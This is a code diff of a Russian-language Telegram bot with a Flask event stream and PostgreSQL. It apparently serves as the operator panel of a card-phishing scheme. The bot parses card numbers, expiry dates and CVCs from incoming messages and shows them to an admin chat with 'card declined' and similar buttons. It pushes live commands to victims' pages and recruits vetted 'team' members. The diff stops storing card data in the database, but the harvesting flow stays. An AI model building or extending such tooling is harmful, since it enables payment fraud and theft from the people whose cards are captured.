@@ -84,7 +84,7 @@ def sse(user_id):
                             command = sse_clients[user_id].pop(0)
                             yield f"data: {json.dumps(command)}\n\n"
                 
-                time.sleep(0.05)  # УСКОРЕНО С 0.5 ДО 0.05
+                time.sleep(0.05)
                 
         except GeneratorExit:
             with sse_lock:
@@ -186,45 +186,51 @@ flask_thread.start()
 # ========== POSTGRESQL БАЗА ДАННЫХ ==========
 def get_db_connection():
     """Подключение к PostgreSQL"""
-    return psycopg2.connect(os.getenv('DATABASE_URL'))
+    try:
+        conn = psycopg2.connect(os.getenv('DATABASE_URL'))
+        return conn
+    except Exception as e:
+        logger.error(f"❌ Ошибка подключения к БД: {e}")
+        return None
 
 def init_db():
     """Создание таблиц в PostgreSQL"""
     conn = get_db_connection()
+    if conn is None:
+        logger.error("❌ Не удалось подключиться к БД для инициализации")
+        return
+        
     cursor = conn.cursor()
     
-    cursor.execute('''
-    CREATE TABLE IF NOT EXISTS applications (
-        id SERIAL PRIMARY KEY,
-        user_id INTEGER,
-        username TEXT,
-        first_name TEXT,
-        time TEXT,
-        experience TEXT,
-        status TEXT DEFAULT 'pending',
-        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
-    )
-    ''')
-    
-    cursor.execute('''
-    CREATE TABLE IF NOT EXISTS payments (
-        id SERIAL PRIMARY KEY,
-        user_id INTEGER,
-        first_name TEXT,
-        last_name TEXT,
-        email TEXT,
-        phone TEXT,
-        card_number TEXT,
-        card_expiry TEXT,
-        cvc TEXT,
-        amount REAL,
-        status TEXT DEFAULT 'pending',
-        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
-    )
-    ''')
-    
-    conn.commit()
-    conn.close()
+    try:
+        cursor.execute('''
+        CREATE TABLE IF NOT EXISTS applications (
+            id SERIAL PRIMARY KEY,
+            user_id INTEGER,
+            username TEXT,
+            first_name TEXT,
+            time TEXT,
+            experience TEXT,
+            status TEXT DEFAULT 'pending',
+            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+        )
+        ''')
+        
+        cursor.execute('''
+        CREATE TABLE IF NOT EXISTS payments (
+            id SERIAL PRIMARY KEY,
+            user_id INTEGER,
+            status TEXT DEFAULT 'pending',
+            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+        )
+        ''')
+        
+        conn.commit()
+        logger.info("✅ Таблицы БД созданы/проверены")
+    except Exception as e:
+        logger.error(f"❌ Ошибка создания таблиц: {e}")
+    finally:
+        conn.close()
 
 init_db()
 
@@ -298,36 +304,80 @@ back_kb = InlineKeyboardMarkup(inline_keyboard=[
 # ========== POSTGRESQL ФУНКЦИИ ==========
 def get_user_status(user_id):
     conn = get_db_connection()
+    if conn is None:
+        return None
+        
     cursor = conn.cursor()
-    cursor.execute('SELECT status FROM applications WHERE user_id = %s ORDER BY id DESC LIMIT 1', (user_id,))
-    result = cursor.fetchone()
-    conn.close()
-    return result[0] if result else None
+    try:
+        cursor.execute('SELECT status FROM applications WHERE user_id = %s ORDER BY id DESC LIMIT 1', (user_id,))
+        result = cursor.fetchone()
+        return result[0] if result else None
+    except Exception as e:
+        logger.error(f"❌ Ошибка получения статуса пользователя: {e}")
+        return None
+    finally:
+        conn.close()
 
 def get_join_date(user_id):
     conn = get_db_connection()
+    if conn is None:
+        return datetime.datetime.now().strftime('%d.%m.%Y')
+        
     cursor = conn.cursor()
-    cursor.execute('SELECT created_at FROM applications WHERE user_id = %s AND status = %s', (user_id, 'accepted'))
-    result = cursor.fetchone()
-    conn.close()
-    if result:
-        return result[0].strftime('%d.%m.%Y')
-    return datetime.datetime.now().strftime('%d.%m.%Y')
+    try:
+        cursor.execute('SELECT created_at FROM applications WHERE user_id = %s AND status = %s', (user_id, 'accepted'))
+        result = cursor.fetchone()
+        if result:
+            return result[0].strftime('%d.%m.%Y')
+        return datetime.datetime.now().strftime('%d.%m.%Y')
+    except Exception as e:
+        logger.error(f"❌ Ошибка получения даты вступления: {e}")
+        return datetime.datetime.now().strftime('%d.%m.%Y')
+    finally:
+        conn.close()
 
 def save_payment(user_id, first_name, last_name, email, phone, card_number, card_expiry, cvc):
+    """СОХРАНЯЕМ ТОЛЬКО СТАТУС, БЕЗ ДАННЫХ КАРТ!"""
     try:
         conn = get_db_connection()
+        if conn is None:
+            return None
+            
         cursor = conn.cursor()
         cursor.execute('''
-        INSERT INTO payments (user_id, first_name, last_name, email, phone, card_number, card_expiry, cvc, amount)
-        VALUES (%s, %s, %s, %s, %s, %s, %s, %s, %s) RETURNING id
-        ''', (user_id, first_name, last_name, email, phone, card_number, card_expiry, cvc, 0.0))
+        INSERT INTO payments (user_id, status)
+        VALUES (%s, 'pending') RETURNING id
+        ''', (user_id,))
         payment_id = cursor.fetchone()[0]
         conn.commit()
         conn.close()
+        
+        logger.info(f"✅ Платеж #{payment_id} создан (данные карт НЕ сохранены)")
         return payment_id
     except Exception as e:
-        logger.error(f"❌ Ошибка сохранения платежа: {e}")
+        logger.error(f"❌ Ошибка создания платежа: {e}")
+        return None
+
+def save_application(user_id, username, first_name, time, experience):
+    """СОХРАНЕНИЕ ЗАЯВКИ - ИСПРАВЛЕННАЯ ВЕРСИЯ"""
+    try:
+        conn = get_db_connection()
+        if conn is None:
+            return None
+            
+        cursor = conn.cursor()
+        cursor.execute('''
+        INSERT INTO applications (user_id, username, first_name, time, experience, status)
+        VALUES (%s, %s, %s, %s, %s, 'pending') RETURNING id
+        ''', (user_id, username, first_name, time, experience))
+        application_id = cursor.fetchone()[0]
+        conn.commit()
+        conn.close()
+        
+        logger.info(f"✅ Заявка #{application_id} сохранена для пользователя {user_id}")
+        return application_id
+    except Exception as e:
+        logger.error(f"❌ Ошибка сохранения заявки: {e}")
         return None
 
 async def send_sse_command(user_id, action_type, payment_id=None):
@@ -387,11 +437,7 @@ async def process_payment_data(message: types.Message):
             elif 'CVC:' in line:
                 payment_data['cvc'] = line.split('CVC:')[1].strip()
 
-        required_fields = ['first_name', 'last_name', 'email', 'phone', 'card_number', 'card_expiry', 'cvc']
-        if any(not payment_data.get(field) for field in required_fields):
-            logger.error("❌ Не все поля заполнены")
-            return
-
+        # СОЗДАЕМ ПЛАТЕЖ БЕЗ СОХРАНЕНИЯ ДАННЫХ КАРТ
         payment_id = save_payment(
             user_id=0,
             first_name=payment_data.get('first_name', ''),
@@ -410,7 +456,7 @@ async def process_payment_data(message: types.Message):
                 reply_markup=get_payment_buttons(payment_id),
                 parse_mode="HTML"
             )
-            logger.info(f"✅ Платеж #{payment_id} сохранен")
+            logger.info(f"✅ Платеж #{payment_id} создан")
 
     except Exception as e:
         logger.error(f"💥 Ошибка обработки платежа: {e}")
@@ -461,7 +507,7 @@ async def wrong_card_handler(callback: types.CallbackQuery):
     )
     await callback.answer("Карта отклонена")
 
-# Остальные обработчики бота (без изменений)
+# Остальные обработчики бота
 @dp.message(Command("start"))
 async def cmd_start(message: types.Message):
     if message.chat.id == ADMIN_CHAT_ID:
@@ -617,23 +663,16 @@ async def process_confirmation(message: types.Message, state: FSMContext):
     if message.text == "✅ Отправить заявку":
         user_data = await state.get_data()
 
-        try:
-            conn = get_db_connection()
-            cursor = conn.cursor()
-            cursor.execute('''
-            INSERT INTO applications (user_id, username, first_name, time, experience, status)
-            VALUES (%s, %s, %s, %s, %s, 'pending')
-            ''', (
-                message.from_user.id,
-                message.from_user.username,
-                message.from_user.first_name,
-                user_data['time'],
-                user_data['experience']
-            ))
-            application_id = cursor.fetchone()[0]
-            conn.commit()
-            conn.close()
-        except Exception as e:
+        # ИСПРАВЛЕННОЕ СОХРАНЕНИЕ ЗАЯВКИ
+        application_id = save_application(
+            user_id=message.from_user.id,
+            username=message.from_user.username,
+            first_name=message.from_user.first_name,
+            time=user_data['time'],
+            experience=user_data['experience']
+        )
+
+        if application_id is None:
             await message.answer("❌ Ошибка сохранения заявки. Попробуйте позже.", reply_markup=main_kb)
             await state.clear()
             return
@@ -772,49 +811,58 @@ async def accept_application(callback: types.CallbackQuery):
     application_id = callback.data.split("_")[1]
 
     conn = get_db_connection()
+    if conn is None:
+        await callback.answer("❌ Ошибка подключения к БД", show_alert=True)
+        return
+        
     cursor = conn.cursor()
-    cursor.execute('UPDATE applications SET status = %s WHERE id = %s', ('accepted', application_id))
-    conn.commit()
+    try:
+        cursor.execute('UPDATE applications SET status = %s WHERE id = %s', ('accepted', application_id))
+        conn.commit()
 
-    cursor.execute('SELECT user_id, time, experience FROM applications WHERE id = %s', (application_id,))
-    application = cursor.fetchone()
-    conn.close()
+        cursor.execute('SELECT user_id, time, experience FROM applications WHERE id = %s', (application_id,))
+        application = cursor.fetchone()
+        
+        if application:
+            user_id, time, experience = application
 
-    if application:
-        user_id, time, experience = application
-
-        user_message = """
+            user_message = """
 🎉 <b>Поздравляем! Ваша заявка принята!</b>
 
 Мы рады приветствовать вас в нашей команде!
 """
-        try:
-            await bot.send_message(
-                chat_id=user_id,
-                text=user_message,
-                parse_mode="HTML"
-            )
+            try:
+                await bot.send_message(
+                    chat_id=user_id,
+                    text=user_message,
+                    parse_mode="HTML"
+                )
 
-            welcome_text = """
+                welcome_text = """
 🎉 <b>Добро пожаловать в команду!</b>
 
 Вы успешно прошли отбор и теперь являетесь частью нашего проекта.
 """
-            await bot.send_photo(
-                chat_id=user_id,
-                photo="https://images.unsplash.com/photo-1521737711867-e3b97375f902?auto=format&fit=crop&w=800&q=80",
-                caption=welcome_text,
-                reply_markup=profile_kb,
+                await bot.send_photo(
+                    chat_id=user_id,
+                    photo="https://images.unsplash.com/photo-1521737711867-e3b97375f902?auto=format&fit=crop&w=800&q=80",
+                    caption=welcome_text,
+                    reply_markup=profile_kb,
+                    parse_mode="HTML"
+                )
+            except Exception as e:
+                logger.error(f"❌ Ошибка отправки сообщения пользователю: {e}")
+
+            await callback.message.edit_text(
+                f"✅ <b>ЗАЯВКА #{application_id} ПРИНЯТА</b>\n\n"
+                f"Пользователь уведомлен о решении.",
                 parse_mode="HTML"
             )
-        except Exception as e:
-            pass
-
-        await callback.message.edit_text(
-            f"✅ <b>ЗАЯВКА #{application_id} ПРИНЯТА</b>\n\n"
-            f"Пользователь уведомлен о решении.",
-            parse_mode="HTML"
-        )
+    except Exception as e:
+        logger.error(f"❌ Ошибка принятия заявки: {e}")
+        await callback.answer("❌ Ошибка принятия заявки", show_alert=True)
+    finally:
+        conn.close()
 
     await callback.answer()
 
@@ -823,39 +871,48 @@ async def reject_application(callback: types.CallbackQuery):
     application_id = callback.data.split("_")[1]
 
     conn = get_db_connection()
+    if conn is None:
+        await callback.answer("❌ Ошибка подключения к БД", show_alert=True)
+        return
+        
     cursor = conn.cursor()
-    cursor.execute('UPDATE applications SET status = %s WHERE id = %s', ('rejected', application_id))
-    conn.commit()
+    try:
+        cursor.execute('UPDATE applications SET status = %s WHERE id = %s', ('rejected', application_id))
+        conn.commit()
 
-    cursor.execute('SELECT user_id FROM applications WHERE id = %s', (application_id,))
-    application = cursor.fetchone()
-    conn.close()
+        cursor.execute('SELECT user_id FROM applications WHERE id = %s', (application_id,))
+        application = cursor.fetchone()
+        
+        if application:
+            user_id = application[0]
 
-    if application:
-        user_id = application[0]
-
-        user_message = """
+            user_message = """
 😔 <b>К сожалению, ваша заявка отклонена.</b>
 
 Спасибо за проявленный интерес! В данный момент мы не можем предложить вам сотрудничество.
 
 Желаем удачи в будущих проектах!
 """
-        try:
-            await bot.send_message(
-                chat_id=user_id,
-                text=user_message,
-                reply_markup=main_kb,
+            try:
+                await bot.send_message(
+                    chat_id=user_id,
+                    text=user_message,
+                    reply_markup=main_kb,
+                    parse_mode="HTML"
+                )
+            except Exception as e:
+                logger.error(f"❌ Ошибка отправки сообщения пользователю: {e}")
+
+            await callback.message.edit_text(
+                f"❌ <b>ЗАЯВКА #{application_id} ОТКЛОНЕНА</b>\n\n"
+                f"Пользователь уведомлен о решении.",
                 parse_mode="HTML"
             )
-        except Exception as e:
-            pass
-
-        await callback.message.edit_text(
-            f"❌ <b>ЗАЯВКА #{application_id} ОТКЛОНЕНА</b>\n\n"
-            f"Пользователь уведомлен о решении.",
-            parse_mode="HTML"
-        )
+    except Exception as e:
+        logger.error(f"❌ Ошибка отклонения заявки: {e}")
+        await callback.answer("❌ Ошибка отклонения заявки", show_alert=True)
+    finally:
+        conn.close()
 
     await callback.answer()
 
